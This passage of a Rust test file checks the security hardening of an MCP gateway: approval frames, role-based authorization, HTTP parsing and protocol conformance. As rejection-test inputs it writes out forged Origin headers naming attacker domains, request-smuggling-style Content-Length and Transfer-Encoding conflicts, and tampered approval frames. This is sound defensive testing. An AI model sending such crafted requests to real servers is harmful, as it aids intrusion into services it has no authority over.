        .handle_request("accounting", &bad_call_req, "agent", Some("tok"));
    assert!(resp.error.is_some());
    let err = resp.error.unwrap();
    assert_eq!(err.code, SCHEMA_PREFLIGHT_FAILED);
    assert_eq!(to_legacy_error_code(err.code), -32035);
    assert!(err.message.contains("Schema preflight validation failed"));
    let violations = err.data.unwrap()["violations"].as_array().unwrap().clone();
    assert!(
        violations.len() >= 2,
        "Expected both missing required and type mismatch violations"
    );

    // explain_error diagnoses SCHEMA_PREFLIGHT_FAILED
    let explain_req = RPCRequest::new(
        2i64,
        "tools/call",
        json!({
            "name": "explain_error",
            "arguments": {
                "server_name": "accounting",
                "tool_name": "refund",
                "error_message": "-32035 SCHEMA_PREFLIGHT_FAILED"
            }
        }),
    );
    let explain_resp = ctx.omni_mcp.handle_request(&explain_req, "agent", None);
    let explain_text = explain_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&explain_text).unwrap();
    assert_eq!(
        parsed["error_code"].as_i64(),
        Some(SCHEMA_PREFLIGHT_FAILED as i64)
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_7_approval_hardening_hmac_and_single_use_32038() {
    let dir = temp_test_path("omni_v47_approval_hmac");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let script = r#"
    async () => {
        const res = await codemode.accounting.refund({ ride_id: "ride_99", reason: "dispute" });
        return { res };
    }
    "#;

    // 1. Initial run suspends with APPROVAL_REQUIRED
    let out = ctx
        .gateway
        .execute_codemode(script, None, true, "agent", Some("tok"), None);
    assert_eq!(out.status, "APPROVAL_REQUIRED");
    assert_eq!(out.error_code, Some(APPROVAL_REQUIRED));
    assert_eq!(out.error_code.map(to_legacy_error_code), Some(-32031));
    let frame = out.suspended_frame.expect("Must have suspended frame");
    assert!(!frame.frame_hmac.is_empty(), "Frame HMAC must be computed");
    assert!(
        !frame.pending_arguments_hash.is_empty(),
        "Pending args hash must be computed"
    );

    let exec_id = frame.execution_id.clone();

    // 2. Resume with valid approver identity succeeds
    let resume_out =
        ctx.gateway
            .resume_codemode(&exec_id, "sec_auditor_alice", None, Some("tok"), None, None);
    assert_eq!(resume_out.status, "OK");
    assert_eq!(resume_out.error_code, None);

    // 3. Replaying the consumed frame is rejected with APPROVAL_INVALID
    let replay_out =
        ctx.gateway
            .resume_codemode(&exec_id, "sec_auditor_alice", None, Some("tok"), None, None);
    assert_eq!(replay_out.status, "APPROVAL_INVALID");
    assert_eq!(replay_out.error_code, Some(APPROVAL_INVALID));
    assert_eq!(
        replay_out.error_code.map(to_legacy_error_code),
        Some(-32038)
    );

    // 4. explain_error diagnoses APPROVAL_INVALID
    let explain_req = RPCRequest::new(
        3i64,
        "tools/call",
        json!({
            "name": "explain_error",
            "arguments": {
                "server_name": "accounting",
                "tool_name": "refund",
                "error_message": "-32038 APPROVAL_INVALID"
            }
        }),
    );
    let explain_resp = ctx.omni_mcp.handle_request(&explain_req, "agent", None);
    let explain_text = explain_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&explain_text).unwrap();
    assert_eq!(parsed["error_code"].as_i64(), Some(APPROVAL_INVALID as i64));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_7_http_surface_hardening() {
    let dir = temp_test_path("omni_v47_http_hardening");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. DNS rebinding protection: Untrusted Origin for localhost Host returns 403
    let mut bad_origin_headers = HashMap::new();
    bad_origin_headers.insert("host".to_string(), "localhost:8080".to_string());
    bad_origin_headers.insert(
        "origin".to_string(),
        "http://malicious-site.com".to_string(),
    );
    let (status, _, _, _) = ctx.handle_http("GET", "/healthz", &bad_origin_headers, &[]);
    assert_eq!(status, 403);

    // 2. Auth required on /api/execute and /api/audit
    let empty_headers = HashMap::new();
    let (exec_status, _, _, _) = ctx.handle_http("POST", "/api/execute", &empty_headers, b"{}");
    assert_eq!(exec_status, 401);

    let (audit_status, _, _, _) = ctx.handle_http("GET", "/api/audit", &empty_headers, &[]);
    assert_eq!(audit_status, 401);

    // With auth token, succeeds
    let mut auth_headers = HashMap::new();
    auth_headers.insert(
        "authorization".to_string(),
        "Bearer operator_secret_token".to_string(),
    );
    let (audit_auth_status, _, _, _) = ctx.handle_http("GET", "/api/audit", &auth_headers, &[]);
    assert_eq!(audit_auth_status, 200);

    // 3. Streamable HTTP GET endpoints
    let (omni_status, _, _, omni_body) = ctx.handle_http("GET", "/omni/mcp", &empty_headers, &[]);
    assert_eq!(omni_status, 200);
    let omni_json = JsonValue::parse(&String::from_utf8(omni_body).unwrap()).unwrap();
    assert_eq!(omni_json["protocol"].as_str(), Some("Streamable HTTP"));

    let (svc_status, _, _, svc_body) =
        ctx.handle_http("GET", "/accounting/mcp", &empty_headers, &[]);
    assert_eq!(svc_status, 200);
    let svc_json = JsonValue::parse(&String::from_utf8(svc_body).unwrap()).unwrap();
    assert_eq!(svc_json["service"].as_str(), Some("accounting"));

    // 4. SSE endpoint returns Deprecation header
    let (sse_status, _, sse_headers, _) = ctx.handle_http("GET", "/sse", &empty_headers, &[]);
    #[cfg(feature = "legacy-sse")]
    {
        assert_eq!(sse_status, 200);
        let has_dep = sse_headers
            .iter()
            .any(|(k, v)| k.eq_ignore_ascii_case("deprecation") && v.contains("@deprecated"));
        assert!(has_dep, "Expected Deprecation header on legacy /sse");
    }
    #[cfg(not(feature = "legacy-sse"))]
    {
        assert_eq!(sse_status, 410);
        let has_dep = sse_headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("deprecation"));
        assert!(has_dep, "Expected Deprecation header on removed /sse");
    }

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_7_persistent_saga_ledger() {
    let dir = temp_test_path("omni_v47_saga_ledger");
    let _ = fs::create_dir_all(&dir);
    let db_path = format!("{}/saga_test.db", dir);

    let comp = omni_mcp::models::SagaCompensationRecord {
        idempotency_key: "saga_idemp_key_101".to_string(),
        forward_server: "payments".to_string(),
        forward_tool: "charge".to_string(),
        compensating_server: "payments".to_string(),
        compensating_tool: "refund".to_string(),
        compensating_args: json!({"charge_id": "ch_555"}),
        status: "PENDING".to_string(),
        compensation_output: JsonValue::Null,
    };

    {
        let store = WalRegistryStore::new(&db_path);
        store.save_saga_compensation(&comp);
        let pending = store.list_pending_saga_compensations();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].idempotency_key, "saga_idemp_key_101");
        store.close();
    }

    // Reopen store from disk and verify recovery across restart
    let reopened = WalRegistryStore::new(&db_path);
    let pending_recovered = reopened.list_pending_saga_compensations();
    assert_eq!(pending_recovered.len(), 1);
    assert_eq!(pending_recovered[0], comp);

    reopened.complete_saga_compensation("saga_idemp_key_101");
    assert!(reopened.list_pending_saga_compensations().is_empty());

    reopened.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_0_auth_matrix_and_trust_boundary_reset() {
    let dir = temp_test_path("omni_v50_trust_boundary");
    let _ = fs::create_dir_all(&dir);

    // 1. A11: validate_bind refuses non-loopback without auth_secret
    let mut no_secret_cfg = OmniConfig {
        data_dir: dir.clone(),
        host: "0.0.0.0".to_string(),
        auth_secret: String::new(),
        ..Default::default()
    };
    assert!(no_secret_cfg.validate_bind("0.0.0.0").is_err());
    assert!(no_secret_cfg.validate_bind("192.168.1.10").is_err());
    assert!(no_secret_cfg.validate_bind("127.0.0.1").is_ok());
    assert!(no_secret_cfg.validate_bind("localhost").is_ok());

    no_secret_cfg.auth_secret = "enterprise_secret_k".to_string();
    assert!(no_secret_cfg.validate_bind("0.0.0.0").is_ok());

    // 2. A1 & A2: Central deny-by-default auth matrix
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        host: "127.0.0.1".to_string(),
        auth_secret: "admin:admin_tok,operator:oper_tok,approver:appr_tok,agent:agent_tok"
            .to_string(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let no_auth = HashMap::new();
    let mut bad_auth = HashMap::new();
    bad_auth.insert(
        "authorization".to_string(),
        "Bearer bogus_token".to_string(),
    );

    let mut agent_auth = HashMap::new();
    agent_auth.insert("authorization".to_string(), "Bearer agent_tok".to_string());

    let mut oper_auth = HashMap::new();
    oper_auth.insert("authorization".to_string(), "Bearer oper_tok".to_string());

    let mut appr_auth = HashMap::new();
    appr_auth.insert("authorization".to_string(), "Bearer appr_tok".to_string());

    let mut admin_auth = HashMap::new();
    admin_auth.insert("authorization".to_string(), "Bearer admin_tok".to_string());

    // (a) Route requiring Agent: /api/stats
    assert_eq!(ctx.handle_http("GET", "/api/stats", &no_auth, &[]).0, 401);
    assert_eq!(ctx.handle_http("GET", "/api/stats", &bad_auth, &[]).0, 401);
    assert_eq!(
        ctx.handle_http("GET", "/api/stats", &agent_auth, &[]).0,
        200
    );
    assert_eq!(ctx.handle_http("GET", "/api/stats", &oper_auth, &[]).0, 200);
    assert_eq!(
        ctx.handle_http("GET", "/api/stats", &admin_auth, &[]).0,
        200
    );

    // (b) Route requiring Operator: /api/audit
    assert_eq!(ctx.handle_http("GET", "/api/audit", &no_auth, &[]).0, 401);
    assert_eq!(ctx.handle_http("GET", "/api/audit", &bad_auth, &[]).0, 401);
    assert_eq!(
        ctx.handle_http("GET", "/api/audit", &agent_auth, &[]).0,
        403
    ); // Agent lacks Operator
    assert_eq!(ctx.handle_http("GET", "/api/audit", &oper_auth, &[]).0, 200);
    assert_eq!(
        ctx.handle_http("GET", "/api/audit", &admin_auth, &[]).0,
        200
    );

    // (c) Route requiring Approver: /api/codemode/suspended
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &no_auth, &[])
            .0,
        401
    );
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &bad_auth, &[])
            .0,
        401
    );
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &agent_auth, &[])
            .0,
        403
    );
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &oper_auth, &[])
            .0,
        403
    );
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &appr_auth, &[])
            .0,
        200
    );
    assert_eq!(
        ctx.handle_http("GET", "/api/codemode/suspended", &admin_auth, &[])
            .0,
        200
    );

    // (d) Route requiring Admin: /api/crawler/trigger
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &no_auth, b"{}")
            .0,
        401
    );
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &bad_auth, b"{}")
            .0,
        401
    );
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &agent_auth, b"{}")
            .0,
        403
    );
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &oper_auth, b"{}")
            .0,
        403
    );
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &appr_auth, b"{}")
            .0,
        403
    );
    assert_eq!(
        ctx.handle_http("POST", "/api/crawler/trigger", &admin_auth, b"{}")
            .0,
        200
    );

    // 3. A3: Human approval gate separation of duties
    let mut frame = omni_mcp::models::SuspendedExecutionFrame {
        execution_id: "01JTESTAPPROVAL000000000001".to_string(),
        script_hash: "hash".to_string(),
        script_source: "codemode.pay.charge()".to_string(),
        instruction_ptr: 1,
        target_var: None,
        serialized_scope: json!({}),
        pending_server: "payments".to_string(),
        pending_tool: "charge".to_string(),
        pending_arguments: json!({"amount": 100}),
        pending_reason: "mutation gate".to_string(),
        policy_context_hash: "pol".to_string(),
        caller_actor: "agent_requester".to_string(),
        logs: Vec::new(),
        completed_mutations: Vec::new(),
        created_at: 1000.0,
        pending_arguments_hash: omni_mcp::storage::audit_log::sha256_hex(b"{\"amount\":100}"),
        expires_at: 5000.0,
        approver_identity: None,
        is_consumed: false,
        frame_hmac: String::new(),
    };
    frame.frame_hmac = frame.compute_hmac("test_secret");

    // Requester cannot approve their own mutation
    let self_approve_err = frame.verify_approval(
        "test_secret",
        "agent_requester",
        Some(&json!({"amount": 100})),
        1100.0,
    );
    assert!(self_approve_err.is_err());
    assert!(self_approve_err
        .unwrap_err()
        .contains("Requester cannot approve their own mutation"));

    // Distinct approver succeeds
    let valid_approve = frame.verify_approval(
        "test_secret",
        "security_officer_bob",
        Some(&json!({"amount": 100})),
        1100.0,
    );
    assert!(valid_approve.is_ok());

    // 4. A4: Missing or invalid frame HMAC rejected
    let mut unverified_frame = frame.clone();
    unverified_frame.frame_hmac = String::new();
    assert!(unverified_frame
        .verify_approval("test_secret", "bob", Some(&json!({"amount": 100})), 1100.0)
        .is_err());

    let mut tampered_frame = frame.clone();
    tampered_frame.pending_tool = "refund_unauthorized".to_string();
    assert!(tampered_frame
        .verify_approval("test_secret", "bob", Some(&json!({"amount": 100})), 1100.0)
        .is_err());

    // 5. A10: Origin "null" and DNS-rebinding attacks are blocked
    let mut null_origin_hdr = HashMap::new();
    null_origin_hdr.insert("host".to_string(), "localhost:8080".to_string());
    null_origin_hdr.insert("origin".to_string(), "null".to_string());
    assert_eq!(
        ctx.handle_http("GET", "/healthz", &null_origin_hdr, &[]).0,
        403
    );

    let mut evil_origin_hdr = HashMap::new();
    evil_origin_hdr.insert("host".to_string(), "localhost:8080".to_string());
    evil_origin_hdr.insert(
        "origin".to_string(),
        "http://localhost.evil.com".to_string(),
    );
    assert_eq!(
        ctx.handle_http("GET", "/healthz", &evil_origin_hdr, &[]).0,
        403
    );

    let mut valid_local_origin_hdr = HashMap::new();
    valid_local_origin_hdr.insert("host".to_string(), "localhost:8080".to_string());
    valid_local_origin_hdr.insert("origin".to_string(), "http://localhost:3000".to_string());
    assert_eq!(
        ctx.handle_http("GET", "/healthz", &valid_local_origin_hdr, &[])
            .0,
        200
    );

    // 6. A7: JSON depth limit rejects deep nesting without stack overflow
    let deep_nest = "[".repeat(70) + &"]".repeat(70);
    let parse_err = JsonValue::parse(&deep_nest);
    assert!(parse_err.is_err());
    assert!(parse_err.unwrap_err().contains("maximum depth"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_0_atomic_cas_concurrent_double_resume_and_digest() {
    let dir = temp_test_path("omni_v50_cas_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = Arc::new(ProductionGatewayContext::new(Some(cfg)));

    let script = r#"
    async () => {
        const res = await codemode.accounting.refund({
            ride_id: "ride_cas_test_1",
            reason: "Charge dispute"
        });
        return res;
    }
    "#;

    // 1. Initial run suspends with APPROVAL_REQUIRED
    let out = ctx
        .gateway
        .execute_codemode(script, None, true, "agent", Some("tok"), None);
    assert_eq!(out.status, "APPROVAL_REQUIRED");
    assert_eq!(out.error_code, Some(APPROVAL_REQUIRED));
    let frame = out.suspended_frame.expect("Must have suspended frame");
    let exec_id = frame.execution_id.clone();
    let pending_hash = frame.pending_arguments_hash.clone();

    // 2. Approver argument digest mismatch is rejected with APPROVAL_INVALID
    let bad_digest_out = ctx.gateway.resume_codemode(
        &exec_id,
        "sec_auditor_alice",
        None,
        Some("tok"),
        None,
        Some("deadbeef1234567890abcdefdeadbeef1234567890abcdefdeadbeef12345678"),
    );
    assert_eq!(bad_digest_out.status, "APPROVAL_INVALID");
    assert_eq!(bad_digest_out.error_code, Some(APPROVAL_INVALID));
    assert!(bad_digest_out.error.unwrap().contains("digest mismatch"));

    // 3. Concurrent double-resume test: spawn 2 threads racing to resume
    let ctx1 = ctx.clone();
    let exec1 = exec_id.clone();
    let hash1 = pending_hash.clone();
    let h1 = std::thread::spawn(move || {
        // Uppercase digest normalization test
        let upper_hash = hash1.to_uppercase();
        ctx1.gateway.resume_codemode(
            &exec1,
            "sec_auditor_alice",
            None,
            Some("tok"),
            None,
            Some(&upper_hash),
        )
    });

    let ctx2 = ctx.clone();
    let exec2 = exec_id.clone();
    let hash2 = pending_hash.clone();
    let h2 = std::thread::spawn(move || {
        ctx2.gateway.resume_codemode(
            &exec2,
            "sec_auditor_bob",
            None,
            Some("tok"),
            None,
            Some(&hash2),
        )
    });

    let res1 = h1.join().expect("Thread 1 join");
    let res2 = h2.join().expect("Thread 2 join");

    let ok_count = (if res1.status == "OK" && res1.error_code.is_none() {
        1
    } else {
        0
    }) + (if res2.status == "OK" && res2.error_code.is_none() {
        1
    } else {
        0
    });
    let rejected_count = (if res1.status == "APPROVAL_INVALID"
        && (res1.error_code == Some(APPROVAL_INVALID) || res1.error_code == Some(-32038))
    {
        1
    } else {
        0
    }) + (if res2.status == "APPROVAL_INVALID"
        && (res2.error_code == Some(APPROVAL_INVALID) || res2.error_code == Some(-32038))
    {
        1
    } else {
        0
    });

    assert_eq!(ok_count, 1, "Exactly one concurrent resume must succeed");
    assert_eq!(
        rejected_count, 1,
        "Exactly one concurrent resume must be rejected by atomic CAS"
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_0_raw_socket_http_framing_and_worker_resilience() {
    use std::io::{Read, Write};

    struct MockStream {
        input: std::io::Cursor<Vec<u8>>,
        output: Vec<u8>,
    }

    impl MockStream {
        fn new(input_bytes: &[u8]) -> Self {
            Self {
                input: std::io::Cursor::new(input_bytes.to_vec()),
                output: Vec::new(),
            }
        }
    }

    impl Read for MockStream {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            self.input.read(buf)
        }
    }

    impl Write for MockStream {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            self.output.write(buf)
        }
        fn flush(&mut self) -> std::io::Result<()> {
            self.output.flush()
        }
    }

    let dir = temp_test_path("omni_v50_raw_framing");
    let _ = fs::create_dir_all(&dir);

    let cfg = OmniConfig {
        data_dir: dir.clone(),
        auth_secret: "test_secret_for_framing_123".to_string(),
        max_body_size_bytes: 1024,
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Case 1: Transfer-Encoding without Content-Length rejected with 501
    {
        let mut mock = MockStream::new(
            b"POST /api/execute HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n",
        );
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        let resp_str = String::from_utf8_lossy(&mock.output);
        assert!(
            resp_str.contains("HTTP/1.1 501 Not Implemented"),
            "Expected 501, got: {}",
            resp_str
        );
        assert!(resp_str.contains("Transfer-Encoding not supported"));
        assert!(resp_str.contains("Connection: close"));
    }

    // Case 2: Malformed Content-Length (non-digit) rejected with 400
    {
        let mut mock = MockStream::new(
            b"POST /api/execute HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 12abc\r\n\r\n",
        );
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        let resp_str = String::from_utf8_lossy(&mock.output);
        assert!(
            resp_str.contains("HTTP/1.1 400 Bad Request"),
            "Expected 400, got: {}",
            resp_str
        );
        assert!(resp_str.contains("Invalid Content-Length"));
        assert!(resp_str.contains("Connection: close"));
    }

    // Case 3: Conflicting Content-Length and Transfer-Encoding rejected with 400
    {
        let mut mock = MockStream::new(
            b"POST /api/execute HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\nhello",
        );
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        let resp_str = String::from_utf8_lossy(&mock.output);
        assert!(
            resp_str.contains("HTTP/1.1 400 Bad Request"),
            "Expected 400, got: {}",
            resp_str
        );
        assert!(resp_str.contains("Conflicting Content-Length / Transfer-Encoding"));
        assert!(resp_str.contains("Connection: close"));
    }

    // Case 4: Content-Length exceeds max_body_size_bytes rejected with 413 and connection closed
    {
        let mut mock = MockStream::new(
            b"POST /api/execute HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 5000\r\n\r\n",
        );
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        let resp_str = String::from_utf8_lossy(&mock.output);
        assert!(
            resp_str.contains("HTTP/1.1 413 Payload Too Large"),
            "Expected 413, got: {}",
            resp_str
        );
        assert!(resp_str.contains("Connection: close"));
    }

    // Case 5: Pipelined keep-alive requests on single persistent connection
    {
        let pipelined = b"GET /healthz HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\n\r\nGET /healthz HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n";
        let mut mock = MockStream::new(pipelined);
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        let resp_str = String::from_utf8_lossy(&mock.output);
        let ok_count = resp_str.matches("HTTP/1.1 200 OK").count();
        assert_eq!(
            ok_count, 2,
            "Expected 2 responses for pipelined keep-alive requests on single BufReader, got: {}",
            resp_str
        );
    }

    // Case 6: Line length cap (A9: reject lines exceeding 8192 bytes)
    {
        let mut huge_line = vec![b'A'; 9000];
        huge_line.extend_from_slice(b"\r\n\r\n");
        let mut mock = MockStream::new(&huge_line);
        omni_mcp::server::handle_stream(&mut mock, &ctx);
        // Connection closed cleanly by server due to line cap error
        assert!(mock.output.is_empty() || String::from_utf8_lossy(&mock.output).contains("431"));
    }

    // Case 7: Panic containment with catch_unwind
    {
        let panic_safe = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            let mut mock = MockStream::new(b"GET /healthz HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n");
            omni_mcp::server::handle_stream(&mut mock, &ctx);
        }));
        assert!(panic_safe.is_ok());
    }

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v5_0_protocol_conformance_2026_07_28() {
    let dir = temp_test_path("omni_v50_protocol_conformance");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. tools/list conformance: resultType == "complete", ttlMs == 300000, cacheScope == "workspace"
    let tools_req = RPCRequest::new(101i64, "tools/list", JsonValue::object());
    let tools_resp = ctx.omni_mcp.handle_request(&tools_req, "agent", None);
    assert!(tools_resp.error.is_none());
    let tools_res = tools_resp.result.as_ref().unwrap();
    assert_eq!(tools_res["resultType"].as_str(), Some("complete"));
    assert_eq!(tools_res["ttlMs"].as_i64(), Some(300000));
    assert_eq!(tools_res["cacheScope"].as_str(), Some("workspace"));
    assert!(validate_mcp_response(&tools_resp.to_json(), "2026-07-28").is_ok());

    // 2. resources/list and resources/templates/list conformance
    let res_req = RPCRequest::new(102i64, "resources/list", JsonValue::object());
    let res_resp = ctx.omni_mcp.handle_request(&res_req, "agent", None);
    assert!(res_resp.error.is_none());
    let res_val = res_resp.result.as_ref().unwrap();
    assert_eq!(res_val["resultType"].as_str(), Some("complete"));
    assert_eq!(res_val["ttlMs"].as_i64(), Some(300000));
    assert_eq!(res_val["cacheScope"].as_str(), Some("workspace"));
    assert!(validate_mcp_response(&res_resp.to_json(), "2026-07-28").is_ok());

    let tpl_req = RPCRequest::new(103i64, "resources/templates/list", JsonValue::object());
    let tpl_resp = ctx.omni_mcp.handle_request(&tpl_req, "agent", None);
    assert!(tpl_resp.error.is_none());
    let tpl_val = tpl_resp.result.as_ref().unwrap();
    assert_eq!(tpl_val["resultType"].as_str(), Some("complete"));
    assert!(tpl_val["resourceTemplates"].is_array());
    assert!(validate_mcp_response(&tpl_resp.to_json(), "2026-07-28").is_ok());

    // 3. prompts/list conformance
    let prompts_req = RPCRequest::new(104i64, "prompts/list", JsonValue::object());
    let prompts_resp = ctx.omni_mcp.handle_request(&prompts_req, "agent", None);
    assert!(prompts_resp.error.is_none());
    let prompts_val = prompts_resp.result.as_ref().unwrap();
    assert_eq!(prompts_val["resultType"].as_str(), Some("complete"));
    assert_eq!(prompts_val["ttlMs"].as_i64(), Some(300000));
    assert!(validate_mcp_response(&prompts_resp.to_json(), "2026-07-28").is_ok());

    // 4. Streamable HTTP header validation (B3): Mcp-Method / Mcp-Name matching and mismatch rejection
    let valid_body = json!({
        "jsonrpc": "2.0",
        "id": 105,
        "method": "tools/call",
        "params": {
            "name": "explain_error",
            "arguments": {
                "server_name": "accounting",
                "tool_name": "refund",
                "error_message": "test error"
            }
        }
    })
    .to_string_compact()
    .into_bytes();

    let mut good_headers = HashMap::new();
    good_headers.insert("content-type".to_string(), "application/json".to_string());
    good_headers.insert("mcp-method".to_string(), "tools/call".to_string());
    good_headers.insert("mcp-name".to_string(), "explain_error".to_string());

    let (good_status, _, resp_headers, _) =
        ctx.handle_http("POST", "/omni/mcp", &good_headers, &valid_body);
    assert_eq!(good_status, 200);
    assert!(resp_headers
        .iter()
        .any(|(k, v)| k.eq_ignore_ascii_case("mcp-method") && v == "tools/call"));
    assert!(resp_headers
        .iter()
        .any(|(k, v)| k.eq_ignore_ascii_case("mcp-name") && v == "explain_error"));

    // Header mismatch Mcp-Method -> 400 + HEADER_MISMATCH (-32020)
    let mut bad_method_headers = good_headers.clone();
    bad_method_headers.insert("mcp-method".to_string(), "tools/list".to_string());
    let (bad_m_status, _, _, bad_m_body) =
        ctx.handle_http("POST", "/omni/mcp", &bad_method_headers, &valid_body);
    assert_eq!(bad_m_status, 400);
    let bad_m_json = JsonValue::parse(&String::from_utf8(bad_m_body).unwrap()).unwrap();
    assert_eq!(
        bad_m_json["error"]["code"].as_i64(),
        Some(HEADER_MISMATCH as i64)
    );

    // Header mismatch Mcp-Name -> 400 + HEADER_MISMATCH (-32020)
    let mut bad_name_headers = good_headers.clone();
    bad_name_headers.insert("mcp-name".to_string(), "other_tool".to_string());
    let (bad_n_status, _, _, bad_n_body) =
        ctx.handle_http("POST", "/omni/mcp", &bad_name_headers, &valid_body);
    assert_eq!(bad_n_status, 400);
    let bad_n_json = JsonValue::parse(&String::from_utf8(bad_n_body).unwrap()).unwrap();
    assert_eq!(
        bad_n_json["error"]["code"].as_i64(),
        Some(HEADER_MISMATCH as i64)
    );

    // 5. io.modelcontextprotocol/tasks extension (B7): tasks/get and tasks/update
    let suspend_script = r#"
    async () => {
        const res = await codemode.accounting.refund({ ride_id: "ride_tasks_1", reason: "charge dispute" });
        return { res };
    }
    "#;
    let out = ctx
        .gateway
        .execute_codemode(suspend_script, None, true, "agent", Some("tok"), None);
    assert_eq!(out.status, "APPROVAL_REQUIRED");
    let task_id = out.suspended_frame.unwrap().execution_id;

    let tasks_get_req = RPCRequest::new(106i64, "tasks/get", json!({"taskId": task_id.clone()}));
    let tasks_get_resp = ctx.omni_mcp.handle_request(&tasks_get_req, "agent", None);
    assert!(tasks_get_resp.error.is_none());
    let task_val = tasks_get_resp.result.unwrap();
    assert_eq!(task_val["taskId"].as_str(), Some(task_id.as_str()));
    assert_eq!(task_val["status"].as_str(), Some("suspended"));
    assert_eq!(task_val["requiresApproval"].as_bool(), Some(true));
    assert_eq!(task_val["resultType"].as_str(), Some("complete"));

    let tasks_update_req = RPCRequest::new(
        107i64,
        "tasks/update",
        json!({
            "taskId": task_id.clone(),
            "action": "resume",
            "approver": "sec_auditor_alice"
        }),
    );
    let tasks_upd_resp = ctx
        .omni_mcp
        .handle_request(&tasks_update_req, "agent", None);
    assert!(tasks_upd_resp.error.is_none());
    let upd_val = tasks_upd_resp.result.unwrap();
    assert_eq!(upd_val["status"].as_str(), Some("completed"));
    assert_eq!(upd_val["resultType"].as_str(), Some("complete"));

    // Verify tasks/get on the completed task returns status "completed" and requiresApproval false
    let tasks_get_after_resp = ctx.omni_mcp.handle_request(&tasks_get_req, "agent", None);
    assert!(tasks_get_after_resp.error.is_none());
    let task_after_val = tasks_get_after_resp.result.unwrap();
    assert_eq!(task_after_val["status"].as_str(), Some("completed"));
    assert_eq!(task_after_val["requiresApproval"].as_bool(), Some(false));
    assert_eq!(task_after_val["resultType"].as_str(), Some("complete"));

    // Test task cancellation via tasks/update
    let cancel_script = r#"
    async () => {
        const res = await codemode.accounting.refund({ ride_id: "ride_tasks_cancel", reason: "testing cancellation" });
        return { res };
    }
    "#;
    let out_cancel =
        ctx.gateway
            .execute_codemode(cancel_script, None, true, "agent", Some("tok"), None);
    assert_eq!(out_cancel.status, "APPROVAL_REQUIRED");
    let cancel_task_id = out_cancel.suspended_frame.unwrap().execution_id;

    let cancel_upd_req = RPCRequest::new(
        108i64,
        "tasks/update",
        json!({
            "taskId": cancel_task_id.clone(),
            "action": "cancel"
        }),
    );
    let cancel_resp = ctx.omni_mcp.handle_request(&cancel_upd_req, "agent", None);
    assert!(cancel_resp.error.is_none());
    assert_eq!(
        cancel_resp.result.unwrap()["status"].as_str(),
        Some("cancelled")
    );

    // Now task is gone
    let cancel_get_req = RPCRequest::new(109i64, "tasks/get", json!({"taskId": cancel_task_id}));
    let cancel_get_resp = ctx.omni_mcp.handle_request(&cancel_get_req, "agent", None);
    assert!(cancel_get_resp.error.is_some());

    // Test invalid action rejection
    let bad_act_req = RPCRequest::new(
        110i64,
        "tasks/update",
        json!({
            "taskId": task_id.clone(),
            "action": "unknown_action_xyz"
        }),
    );
    let bad_act_resp = ctx.omni_mcp.handle_request(&bad_act_req, "agent", None);
    assert!(bad_act_resp.error.is_some());

    // Schema validation of initialize and server/discover responses under 2026-07-28
    let init_req = RPCRequest::new(
        111i64,
        "initialize",
        json!({"protocolVersion": "2026-07-28"}),
    );
    let init_resp = ctx.omni_mcp.handle_request(&init_req, "agent", None);
    assert!(init_resp.error.is_none());
    assert!(validate_mcp_response(&init_resp.to_json(), "2026-07-28").is_ok());

    let disc_req = RPCRequest::new(112i64, "server/discover", JsonValue::object());
    let disc_resp = ctx.omni_mcp.handle_request(&disc_req, "agent", None);
    assert!(disc_resp.error.is_none());
